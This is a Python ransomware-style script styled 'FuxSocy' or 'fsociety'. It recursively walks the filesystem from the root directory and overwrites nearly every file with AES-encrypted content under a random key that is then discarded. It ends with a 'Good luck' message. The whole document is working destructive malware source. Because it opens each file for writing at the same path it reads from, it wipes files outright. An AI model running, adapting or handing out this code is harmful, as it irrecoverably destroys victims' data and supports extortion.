import os
import time
import sys
import subprocess
from random import SystemRandom
from string import ascii_letters, digits, punctuation
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
from Crypto import Random

SALT = 'fsociety'
START = '/'
CS = 64 * 1024


def encrypt(root, filename, key):
    if ('fsociety.py' not in filename) and ('fsociety.dat' not in filename):
        filepath = root + '/' + filename
        filesize = str(os.path.getsize(filepath)).zfill(16)
        iv = Random.new().read(16)
        encryptor = AES.new(key, AES.MODE_CBC, iv)
        try:
            with open(filepath, 'rb') as infile:
                with open(filepath, 'wb') as outfile:
                    outfile.write(filesize.encode('utf-8'))
                    outfile.write(iv)
                    while True:
                        chunk = infile.read(CS)
                        if len(chunk) == 0:
                            break
                        elif len(chunk) % 16 != 0:
                            chunk += b' ' * (16 - (len(chunk) % 16))
                        outfile.write(encryptor.encrypt(chunk))
        except:
            pass


def recurse(dir, key):
    root = next(os.walk(dir))[0]
    dirs = next(os.walk(dir))[1]
    files = next(os.walk(dir))[2]
    # print('root={0}, dir={1}, file={2}'.format(root, dirs, files))

    for file in files:
        try:
            # Start encrypting
            print('Encrypting files')
            encrypt(root, file, key)
        except:
            pass

    if len(dirs) > 0:
        for di in dirs:
            try:
                subdirs = next(os.walk(os.path.join(root, dir)))[1]
                subfiles = next(os.walk(os.path.join(root, dir)))[2]
                for subfile in subfiles:
                    try:
                        print('Encrypting subfiles')
                        encrypt(next(os.walk(os.path.join(root, di)))[0], subfile, key)
                    except:
                        pass
                if len(subdirs) > 0:
                    for subdir in subdirs:
                        path = root + '/' + di + '/' + subdir
                        try:
                            recurse(path, key)
                        except:
                            pass
            except:
                pass


def generate_key(salt):
    os.urandom(16)
    print('Loading Source of Entropy')
    password = salt.join((''.join(
        SystemRandom().choice(ascii_letters + digits + punctuation) for x in range(SystemRandom().randint(40, 160))))
                         for x in range(SystemRandom().randint(80, 120)))
    # print('password ', password)
    update(0.3)
    time.sleep(0.4)
    update(0.6)
    time.sleep(0.2)
    update(1)
    print()
    print('\nGenerating keys')
    update(0.3)
    hasher = SHA256.new(password.encode('utf-8'))
    # print("Hasher ", hasher)
    time.sleep(0.6)
    update(0.5)
    time.sleep(0.6)
    update(1)
    print()
    print()
    return hasher.digest()


def update(progress):
    barLenght = 23
    status = ""
    if isinstance(progress, int):
        progress = float(progress)
    if progress >= 1:
        progress = 1
        status = "COMPLETE"
    block = int(round(barLenght * progress))
    loading = "\r{0}\t\t{1}".format("#" * block + " " * (barLenght - block), status)
    sys.stdout.write(loading)
    sys.stdout.flush()


def main():
    subprocess.call('clear')
    print('Executing FuxSocy')
    key = generate_key(SALT)
    print("ket", key)
    print('Locating target files...')
    dirs = next(os.walk(START))[1]
    print(dirs)
    time.sleep(0.7)
    print('Beginning crypto operations')
    for dir in dirs:
        if START == '/':
            directory = START + dir
            print('if ', directory)
        else:
            directory = START + '/' + dir
            print('else ', directory)
        if (directory != '/run') and (directory != '/lib') and (directory != '/proc'):
            print('Encrypting {}'.format(directory))
            recurse(directory, key)
    files = next(os.walk(START))[2]
    for file in files:
        try:
            print("Encrypting files in root")
            encrypt(START, file, key)
        except:
            pass
    print("Good luck")
    print()
    with open('fsociety.dat') as f:
        for line in f:
            print(line)
    del key
    exit(0)


if __name__ == '__main__':
    main()
